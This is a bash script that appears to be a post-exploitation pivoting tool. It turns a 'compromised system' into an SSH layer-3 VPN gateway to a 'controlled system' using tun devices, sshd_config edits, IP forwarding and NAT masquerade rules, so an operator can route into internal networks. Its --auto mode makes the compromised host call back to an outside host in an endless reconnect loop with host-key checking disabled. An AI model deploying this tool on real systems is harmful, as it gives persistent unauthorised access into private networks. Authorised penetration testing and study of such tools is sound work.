#!/bin/bash

# Define color codes
GREEN='\033[0;32m' # Green
NC='\033[0m'       # No Color
auto_username=""
auto_ip=""

# Function to display the help menu
show_help() {
  echo "Usage: sudo $0 [OPTIONS]"
  echo "Options:"
  echo "  -h, --help             Display this help menu"
  echo "  -s, --source           Set up the controlled system"
  echo "  -t, --target           Set up the compromised system"
  echo "  -r, --routes [route(s)] Add routes (required with -s or -t)"
  echo "  -i, --interface        Specify the outgoing interface (default: eth0)"
  echo "  -a, --auto [username] [ipaddress]    Automatically connect using SSH tunnel (only supported using pub/priv key)"
  echo "  --cleanup [source|target]  Remove setup for controlled or compromised system"
  echo ""
  echo "Example usage:"
  echo "  To set up the controlled system with a single route:"
  echo "  sudo $0 -r 10.60.1.0/24 -s"
  echo "  To set up the target system with a single route:"
  echo "  sudo $0 -r 10.60.1.0/24 -i enps1 -t"
  echo "  To set up the target system to automatically connect back (polling system):"
  echo "  sudo $0 -r routes.txt -i enps1 --auto whitehat 123.123.123.123"
  echo ""
}

# Function to add routes
add_routes() {
  local routes=$1
  local device=$2
  local route
  IFS=',' read -ra route_array <<< "$routes"  # Split comma-separated routes
  for route in "${route_array[@]}"; do
    # Display a message for each route
    echo "[+] Adding route: $route via $device dev tun0"
  done
}

# Function to change SSH configuration on the controlled system
change_ssh_config_controlled() {
  # Check if the PermitTunnel directive is already present and uncommented
  if grep -q "^\s*PermitTunnel yes" /etc/ssh/sshd_config; then
    echo "[+] SSH configuration already includes PermitTunnel yes"
  else
    # Remove any commented-out PermitTunnel directive and add the active one
    sed -i '/^#\?PermitTunnel/d' /etc/ssh/sshd_config
    echo "PermitTunnel yes" >> /etc/ssh/sshd_config
    echo "[+] Added PermitTunnel yes to SSH configuration on the controlled system"
  fi

  # Check if the ClientAliveInterval directive is present and remove it if found
  if grep -q "^\s*ClientAliveInterval" /etc/ssh/sshd_config; then
    sed -i '/ClientAliveInterval/d' /etc/ssh/sshd_config
    echo "[+] Removed ClientAliveInterval from SSH configuration"
  fi

  # Check if the ClientAliveCountMax directive is present and remove it if found
  if grep -q "^\s*ClientAliveCountMax" /etc/ssh/sshd_config; then
    sed -i '/ClientAliveCountMax/d' /etc/ssh/sshd_config
    echo "[+] Removed ClientAliveCountMax from SSH configuration"
  fi

  # Add the ClientAliveInterval and ClientAliveCountMax directives
  echo "ClientAliveInterval 60" >> /etc/ssh/sshd_config
  echo "ClientAliveCountMax 3" >> /etc/ssh/sshd_config
  echo "[+] Added ClientAliveInterval and ClientAliveCountMax to SSH configuration on the controlled system"

  # Restart the SSH service to apply the changes
  systemctl restart ssh
  echo "[+] SSH service restarted"
}

wait_for_ssh_connection() {
  local icmp_received=0

  # Start monitoring ICMP packets directed towards 10.10.255.2 on the tun1 interface
  while [ $icmp_received -eq 0 ]; do
    tcpdump_output=$(tcpdump -i tun1 -n icmp and dst host 10.10.255.2 -c 1 2>/dev/null)
    if echo "$tcpdump_output" | grep -q "ICMP echo request"; then
      icmp_received=1
      break
    fi
  done

  if [ $icmp_received -eq 1 ]; then
    echo -e "${GREEN}[✓] ICMP packet received... Happy Hacking! :)${NC}"
  else
    echo "[!] No ICMP packet received yet."
  fi
}

# Function to set up the controlled system
setup_controlled_system() {
  # Check and configure UFW if enabled
  if command -v ufw >/dev/null; then
    ufw_status=$(sudo ufw status verbose | grep -i "Status:" | awk '{print $2}')
    if [[ "$ufw_status" == "active" ]]; then
      routed_status=$(sudo ufw status verbose | grep -i "Default:" | grep "routed" | awk '{print $4}')
      if [[ "$routed_status" == "deny" ]]; then
        echo "[+] UFW routed traffic is denied. Changing to allow."
        sudo ufw default allow routed
        ufw_routed_changed=true
      else
        echo "[+] UFW routed traffic is already allowed. No changes made."
      fi
    else
      echo "[+] UFW is not active. No changes required."
    fi
  else
    echo "[!] UFW is not installed or available. Skipping UFW configuration."
  fi
  # Implement controlled system setup steps
  ip tuntap add dev tun1 mode tun
  ip addr add 10.10.255.2/30 dev tun1
  echo "[+] Added IP to tun1"
  ip link set dev tun1 up
  echo "[+] tun1 link is now up"
  IFS=',' read -ra route_array <<< "$routes"  # Split comma-separated routes
  for route in "${route_array[@]}"; do
    ip route add "$route" via 10.10.255.1 dev tun1
    echo "[+] Set up routing rule for route $route"
  done

  # Display additional messages
  echo "[+] Adding ICMP allow on tun1 for monitoring purposes"
  iptables -A INPUT -i tun1 -p icmp --icmp-type echo-request -j ACCEPT
  echo "[!] To complete the setup for VPN connection, on the target host, run:"
  echo "[!] sudo $0 -r <route(s)> -i <outgoing interface> -t"
  wait_for_ssh_connection
}

# Function to set up the compromised system
setup_compromised_system() {
  # Implement compromised system setup steps
  ip tuntap add dev tun0 mode tun user root

  echo "[+] Adding tuntap device tun0 for user root"
  ip addr add 10.10.255.1/30 dev tun0
  echo "[+] Adding ip address to tun0"
  ip link set dev tun0 up
  echo "[+] Activating tun0"
  modprobe tun
  echo "[+] Ran modprobe tun"
  # Check if IP forwarding is already enabled
  current_ip_forward_setting=$(sysctl -n net.ipv4.ip_forward)
  if [ "$current_ip_forward_setting" -eq 0 ]; then
    sysctl -w net.ipv4.ip_forward=1
    echo "[+] Enabled IP forwarding"
  else
    echo "[!] IP forwarding is already enabled"
  fi
  ip route add 10.10.255.2 via 10.10.255.1 dev tun0
  echo "[+] Added route for 10.10.255.2 via 10.10.255.1 dev tun0"
  IFS=',' read -ra route_array <<< "$routes"  # Split comma-separated routes
  for route in "${route_array[@]}"; do
    iptables -t nat -A POSTROUTING -d $route -o $interface -j MASQUERADE
    echo "[!] Added iptable rule for $route on $interface !"
  done

  # Create the SSH tunnel
  echo "[!] To create tunnel run:"
  echo -e "${GREEN}ssh -f -N -w 0:1 <user@target>${NC}"
}

setup_auto_compromised_system() {
  # Function to check if the SSH tunnel is active
  check_connection() {
    ping -c 1 -W 5 10.10.255.2 > /dev/null 2>&1
  }

# Function to terminate old SSH processes
terminate_old_connections() {
  # Use pgrep to find SSH processes associated with the script
  for pid in $(pgrep -f "ssh -o StrictHostKeyChecking=no -f -N -w 0:1 $auto_username@$auto_ip"); do
    # Check if the process still exists
    if kill -0 "$pid" 2>/dev/null; then
      echo "[!] Terminating old SSH process: $pid"
      kill "$pid"
    else
      # Process doesn't exist anymore, remove it from the list
      echo "[!] Process $pid already terminated or doesn't exist."
    fi
  done
}

  # Implement compromised system setup steps
  ip tuntap add dev tun0 mode tun user root

  echo "[+] Adding tuntap device tun0 for user root"
  ip addr add 10.10.255.1/30 dev tun0
  echo "[+] Adding ip address to tun0"
  ip link set dev tun0 up
  echo "[+] Activating tun0"
  modprobe tun
  echo "[+] Ran modprobe tun"
  # Check if IP forwarding is already enabled
  current_ip_forward_setting=$(sysctl -n net.ipv4.ip_forward)
  if [ "$current_ip_forward_setting" -eq 0 ]; then
    sysctl -w net.ipv4.ip_forward=1
    echo "[+] Enabled IP forwarding"
  else
    echo "[!] IP forwarding is already enabled"
  fi
  ip route add 10.10.255.2 via 10.10.255.1 dev tun0
  echo "[+] Added route for 10.10.255.2 via 10.10.255.1 dev tun0"
  IFS=',' read -ra route_array <<< "$routes"  # Split comma-separated routes
  for route in "${route_array[@]}"; do
    iptables -t nat -A POSTROUTING -d $route -o $interface -j MASQUERADE
    echo "[!] Added iptable rule for $route on $interface !"
  done

  # Create the SSH tunnel initially and store its PID
  ssh -o StrictHostKeyChecking=no -f -N -w 0:1 "$auto_username@$auto_ip"
  # Store the PID of the initial SSH process
  initial_ssh_pid=$!
  old_connection_pids+=("$initial_ssh_pid")
  # List to store old connection process IDs
  declare -a old_connection_pids

  # Monitor and automatically reconnect if the connection is lost
  while true; do
    # Check if the connection is active
    if ! check_connection; then
      echo "[!] Connection lost. Reconnecting..."
      # Terminate old SSH processes
      terminate_old_connections
      # Close any existing SSH control socket
      ssh -O exit -S "$CONTROL_SOCKET" > /dev/null 2>&1
      # Create the SSH tunnel again and store its process ID
      ssh -o StrictHostKeyChecking=no -f -N -w 0:1 "$auto_username@$auto_ip" &
      # Store the new SSH process ID
      new_pid=$!
      old_connection_pids+=("$new_pid")
      echo "[!] SSH tunnel recreated."
    else
      echo "[✓] Connection is active."
    fi
    # Wait for a few seconds before checking again
    sleep 10
  done
}

cleanup_controlled_system() {
  if [ -n "$routes" ]; then
    # Remove added route
    echo "[-] Removed routes."
    ip route del "$routes" via 10.10.255.2 dev tun1
  fi
  # Remove TUN/TAP adapter
  ip link del tun1

  # Check and remove PermitTunnel setting
  if grep -q "^\s*PermitTunnel yes" /etc/ssh/sshd_config; then
    sed -i '/PermitTunnel yes/d' /etc/ssh/sshd_config
    echo "[-] Removed PermitTunnel yes from SSH configuration"
  fi

  # Check and remove ClientAliveInterval setting
  if grep -q "^\s*ClientAliveInterval" /etc/ssh/sshd_config; then
    sed -i '/ClientAliveInterval/d' /etc/ssh/sshd_config
    echo "[-] Removed ClientAliveInterval from SSH configuration"
  fi

  # Check and remove ClientAliveCountMax setting
  if grep -q "^\s*ClientAliveCountMax" /etc/ssh/sshd_config; then
    sed -i '/ClientAliveCountMax/d' /etc/ssh/sshd_config
    echo "[-] Removed ClientAliveCountMax from SSH configuration"
  fi

  # Restart the SSH service to apply the changes
  systemctl restart ssh
  echo "[!] Cleaned up the controlled system"
}

# Function to remove the setup on the compromised system
cleanup_compromised_system() {
  IFS=',' read -ra route_array <<< "$routes"  # Split comma-separated routes
  for route in "${route_array[@]}"; do
    iptables-save | grep -v "$route" | iptables-restore
    echo "[-] Removed NAT rule(s) for route(s) $route"
  done
  # Remove added route
  ip route del 10.10.255.2 via 10.10.255.1 dev tun0
  # Remove TUN/TAP adapter
  ip link del tun0
  # Restore UFW routed default if changed
  if [ "$ufw_routed_changed" = true ]; then
    echo "[+] Restoring UFW routed traffic default to deny."
    sudo ufw default deny routed
  fi
  echo "[!] Cleaned up the compromised system"
}

# Main script
if [ "$#" -eq 0 ]; then
  show_help
  exit 1
fi

if [[ $EUID -ne 0 ]]; then
  echo "This script must be run with sudo to create TUN/TAP adapters."
  exit 1
fi

# Process arguments and enforce combinations
while [[ $# -gt 0 ]]; do
  case "$1" in
    -h | --help)
      show_help
      exit 0
      ;;
    -r | --routes)
      if [ -n "$2" ]; then
        if [ -f "$2" ]; then
          # Read routes from a file
          routes=$(cat "$2")
        else
          # Use provided routes
          routes="$2"
        fi
        shift
      else
        echo "[-] No routes specified. Use a valid route like '10.60.1.0/24' or a file containing routes."
        exit 1
      fi
      ;;
    -i | --interface)
      if [ -n "$2" ]; then
        interface="$2"
        shift
      else
        echo "[-] No interface specified. Using default interface: eth0."
      fi
      ;;
    -s | --source)
      source_option=true
      if [ -z "$routes" ]; then
        echo "[-] The -s or --source option requires the -r or --routes option."
        show_help
        exit 1
      fi
      # Implement controlled system setup steps
      change_ssh_config_controlled
      setup_controlled_system
      ;;
    -t | --target)
      if [ -z "$routes" ] || [ -z "$interface" ]; then
        echo "[-] The -t or --target option requires the -r or --routes option and the -i or --interface option."
        show_help
        exit 1
      fi
      if [ -n "$auto_username" ] && [ -n "$auto_ip" ]; then
        setup_auto_compromised_system
      else
        setup_compromised_system
      fi
      ;;
    -a | --auto)
      if [ -z "$routes" ] || [ -z "$interface" ]; then
        echo "[-] Routes, interface, username, ip address are required arguments for --auto."
        show_help
        exit 1
      else
        auto_username="$2"
        auto_ip="$3"
        setup_auto_compromised_system
      fi
      ;;
    --cleanup)
      if [ -n "$2" ]; then
        case "$2" in
          source)
            cleanup_controlled_system
            ;;
          target)
            cleanup_compromised_system
            ;;
          *)
            echo "Invalid argument for --cleanup. Use 'source' or 'target'."
            show_help
            exit 1
            ;;
        esac
        shift
      else
        echo "[-] No argument specified for --cleanup. Use 'source' or 'target'."
        exit 1
      fi
      ;;
    *)
      echo "Invalid option: $1"
      show_help
      exit 1
      ;;
  esac
  shift
done
